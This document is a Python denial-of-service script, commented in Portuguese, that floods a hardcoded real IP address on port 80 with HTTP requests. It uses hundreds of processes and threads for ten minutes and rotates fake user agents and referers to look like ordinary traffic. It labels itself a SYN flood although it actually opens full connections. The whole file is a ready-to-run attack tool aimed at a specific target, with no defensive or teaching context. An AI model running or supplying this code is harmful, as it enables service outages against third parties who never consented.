import socket
import random
import string
import multiprocessing
import threading
import time

# Lista de User Agents e referers
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 OPR/39.0.2256.71",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 OPR/39.0.2256.71",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
]

referers = [
    "https://www.google.com",
    "https://www.bing.com",
    "https://www.yahoo.com",
    "https://www.duckduckgo.com",
    "https://www.ask.com",
]

# Função para gerar uma string aleatória de tamanho especificado
def random_string(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

# Função para enviar requisições SYN
def send_syn(ip, port, user_agent, referer):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.settimeout(1)
        s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {user_agent}\r\nReferer: {referer}\r\nConnection: keep-alive\r\n\r\n".encode())
        s.close()
    except:
        pass

# Função para iniciar o ataque SYN Flood com threads
def syn_flood_threads(ip, port, user_agents, referers, num_threads, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        user_agent = random.choice(user_agents)
        referer = random.choice(referers)
        send_syn(ip, port, user_agent, referer)

# Definição do alvo
target_ip = "177.153.49.2"
target_port = 80

# Número de threads e processos
num_threads = 512
num_processes = 313

# Duração em segundos
duration = 600

# Iniciar processos
processes = []
for _ in range(num_processes):
    p = multiprocessing.Process(target=syn_flood_threads, args=(target_ip, target_port, user_agents, referers, num_threads, duration))
    p.start()
    processes.append(p)

# Iniciar threads
for _ in range(num_processes):
    threading.Thread(target=syn_flood_threads, args=(target_ip, target_port, user_agents, referers, num_threads, duration)).start()

# Esperar até que todos os processos terminem
for p in processes:
    p.join()